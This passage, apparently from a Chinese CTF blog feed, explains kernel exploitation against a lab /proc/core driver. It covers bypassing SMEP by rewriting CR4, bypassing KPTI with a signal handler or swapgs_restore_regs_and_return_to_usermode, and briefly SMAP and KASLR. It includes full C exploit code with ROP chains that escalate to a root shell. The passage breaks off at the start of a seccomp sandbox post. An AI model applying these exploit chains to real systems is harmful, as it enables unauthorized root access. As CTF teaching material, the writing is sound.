<p>如上题的start.sh更改如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./mycore.cpio \</span><br><span class="line">-cpu qemu64-v1,+smep \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>那么我们如果再次进入内核环境并调用我们的ret2usr的exp，内核就会直接panic，主要是因为开启了smep保护。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301113143244.png"
                      class=""
                >

<p>那么我们就可以开始找能够更改cr4寄存器值的gadget，首先肯定是检索cr4，我们关注中间的几个gadget。其中有的<code>push rcx; popfq;</code>这种实际上不用管，相当于把rcx寄存器的值存到e&#x2F;rflags寄存器中。那么我们可以通过控制rax或rdi来控制cr4。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301150149544.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301150749543.png"
                      class=""
                >

<p>比如我找了<code>pop rdi;ret</code>的gadget，然后就能完全控制cr4寄存器的值了。为了关闭 smep 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code>。从 <code>0x6f0</code> 可以看出它 <strong>启用了以下 CR4 位</strong>：</p>
<table>
<thead>
<tr>
<th>Bit</th>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>PGE</td>
<td>启用全局页，提高 TLB 命中率</td>
</tr>
<tr>
<td>9</td>
<td>OSFXSR</td>
<td>启用 <code>FXSAVE/FXRSTOR</code> 指令</td>
</tr>
<tr>
<td>10</td>
<td>OSXMMEXCPT</td>
<td>允许 SSE 异常处理</td>
</tr>
<tr>
<td>5</td>
<td>PAE</td>
<td>启用物理地址扩展</td>
</tr>
<tr>
<td>4</td>
<td>PSE</td>
<td>启用 4MB 大页</td>
</tr>
<tr>
<td>6</td>
<td>MCE</td>
<td>启用机器检查异常</td>
</tr>
</tbody></table>
<p>这些是正常的系统默认启用的 CPU 特性，并不会影响漏洞利用。</p>
<p>rop更改如下，然后就能正常直接走ret2usr：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 10; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    rop[i] = canary;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">rop[i++] = (size_t)getPrivilege;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret</span></span><br><span class="line"><span class="comment">rop[i++] = 0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = (size_t)spawn_shell;       // rip </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = user_cs;</span></span><br><span class="line"><span class="comment">rop[i++] = user_rflags;</span></span><br><span class="line"><span class="comment">rop[i++] = user_sp;</span></span><br><span class="line"><span class="comment">rop[i++] = user_ss;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset;     <span class="comment">//pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81075014</span> + offset;      <span class="comment">// mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>改前后的cr4寄存器值如下，确实能够成功修改。然后我们回去把init改成用普通用户启动，测试是否能够提权。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301161655713.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301161831159.png"
                      class=""
                >

<p>绕过smep，成功提权。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301170816953.png"
                      class=""
                >

<p>但实际上现代内核中通常会采用“CR4钉住”（CR4 pinning）的机制，使得即使你尝试修改这些位（包括SMAP和SMEP相关位），内核会自动恢复它们的固定状态，从而防止这种简单的修改。所以现在ret2usr这种利用手法已经几乎失效了，一般只能走内核ROP，比如用后述kpti得绕过方法。</p>
<h4 id="kpti保护绕过"><a href="#kpti保护绕过" class="headerlink" title="kpti保护绕过"></a>kpti保护绕过</h4><p>KPTI（Kernel Page-Table Isolation，内核页表隔离）是一种 <strong>安全防御机制</strong>，用于 <strong>防止内核地址泄露</strong>，主要是为了 <strong>缓解 Meltdown 漏洞</strong>（CVE-2017-5754）。</p>
<p>在 <strong>启用 KPTI</strong> 的系统上：</p>
<ul>
<li>用户态运行时，<strong>完全隔离</strong> 内核的页表，防止用户态进程访问或推测出内核地址。</li>
<li>只有在 <strong>发生系统调用（syscall）、中断或异常</strong> 时，才会 <strong>切换到内核页表</strong> 进行内核代码执行。</li>
</ul>
<p>在 <strong>未启用 KPTI</strong> 的情况下，<code>CR3</code> 指向的页表包含 <strong>用户态和内核态的地址映射</strong>。<br><strong>问题</strong>：Meltdown 攻击可以利用 CPU 的 <strong>推测执行漏洞</strong>，从用户态<strong>读取</strong>本应受保护的 <strong>内核地址</strong>！</p>
<p> <strong>KPTI 通过修改 <code>CR3</code> 来隔离页表：</strong></p>
<ul>
<li>用户态执行时：<code>CR3</code> 只加载 <strong>用户页表</strong>（不包含内核页表）。</li>
<li>进入内核态时（如 <code>syscall</code>）：<code>CR3</code> 切换到 <strong>完整页表</strong>（包含用户和内核页表）。</li>
</ul>
<p>KPTI保护机制的绕过主要包括异常处理以及页表切换两种绕过利用手法，到了kpti这种保护时其实我们的ret2usr手法已经不能生效了，需要构建内核ROP并绕过限制，我们还是以上面的题目为例，启动脚本加上<code>kpti=1</code>来启用页表隔离，注意这里cpu参数中用的是kvm64模型（这个模型默认kpti是开启的，这里手动指定方便查看），之前的qemu64-v1会启动不了kpti。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./mycore.cpio \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr kpti=1&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure></div>



<h5 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h5><p>首先我们来看看如果不用异常处理，而是直接ROP着陆用户态执行用户代码，那么最后会爆<strong>Segmentation fault</strong>。这是因为在 KPTI 启用的情况下，用户态和内核态的 <code>CR3</code> <strong>必须</strong>正确切换，否则CPU <strong>仍然使用内核页表访问用户态地址</strong>，就会崩溃。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301205945326.png"
                      class=""
                >

<p>所以主要思路是捕获<code>Segmentation fault</code>的异常，在异常处理中调用<code>system(/bin/sh)</code>。这种方式能成功地关键在于内核ROP时其实已经成功把当前进程的cred换成了具有root权限的cred。之后靠异常处理就能获得到root权限的shell。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc kpti_bypass.c -static -masm=intel -g -o kpti_bypass</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            </span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, spawn_shell);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301211900339.png"
                      class=""
                >

<h5 id="页表切换"><a href="#页表切换" class="headerlink" title="页表切换"></a>页表切换</h5><p>借鉴之前改cr4寄存器实现绕过smep的方式，这里我们可以通过操作cr3寄存器实现kpti的绕过。这种方式用的是<strong>swapgs_restore_regs_and_return_to_usermode</strong>函数，这个函数是 <strong>Linux 内核</strong> 在 <strong>从内核态返回用户态</strong> 时使用的一个关键函数，它主要用于 <strong>处理 KPTI（Kernel Page Table Isolation）</strong> 以及 <strong>恢复用户态寄存器</strong>。</p>
<p>该函数的内部存在修改<code>CR3</code>的操作，因此只需要调用该函数，就可以从内核空间的页表修改为用户空间的页表。这里有个小trick，就是能够从该函数偏移0x16处开始执行，因为前面是一排弹栈操作，十分吃ROP空间，而且对后面影响不大。最后注意调用该函数+0x16时，最后还会从栈上弹两个地址，需要我们填充。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301220750057.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301220932948.png"
                      class=""
                >

<p>最后就能成功进入我们的shell中</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301221120036.png"
                      class=""
                >

<p>获取地址偏移方式如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301213354984.png"
                      class=""
                >

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ROP</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret</span></span><br><span class="line"><span class="comment">// rop[i++] = 0;</span></span><br><span class="line"><span class="comment">// rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; </span></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a008da</span> + offset + <span class="number">0x16</span>; <span class="comment">// swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h4 id="smap保护绕过"><a href="#smap保护绕过" class="headerlink" title="smap保护绕过"></a>smap保护绕过</h4><p>SMAP，全称 <strong>Supervisor Mode Access Prevention</strong>，是一种硬件安全机制，主要用于防止内核意外或恶意地访问用户空间内存。</p>
<p>此时使用<code>swapgs_restore_regs_and_return_to_usermode</code>函数也是完全可以绕过的，因此可以直接使用它构建<code>ROP</code>链。</p>
<p>若rop长度不够需要栈迁移，则需要更加精巧的手段，我们放到以后学习。</p>
<h4 id="kaslr保护绕过"><a href="#kaslr保护绕过" class="headerlink" title="kaslr保护绕过"></a>kaslr保护绕过</h4><p>与正常pwn题的aslr绕过类似，需要找到漏洞点泄露地址，进而算出基址，与用户态下的利用没有区别。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>self-made sandbox</title>
    <url>/blog/2024/09/21/self-made-sandbox/</url>
    <content><![CDATA[<p>由于最近要打几场awd，一个一个漏洞改过来感觉有点麻烦，所以想到了上沙箱，但是一般好像比赛会禁止上通防，这里想试试看自己通过系统调用写一个沙箱出来，看看能不能瞒天过海。</p>
<h3 id="一、c代码实现沙箱"><a href="#一、c代码实现沙箱" class="headerlink" title="一、c代码实现沙箱"></a>一、c代码实现沙箱</h3><p>不是很清楚沙箱具体用到的系统调用，所以先让gpt生成了一段正常用c语言实现的沙箱代码。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="comment">//gcc -g test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 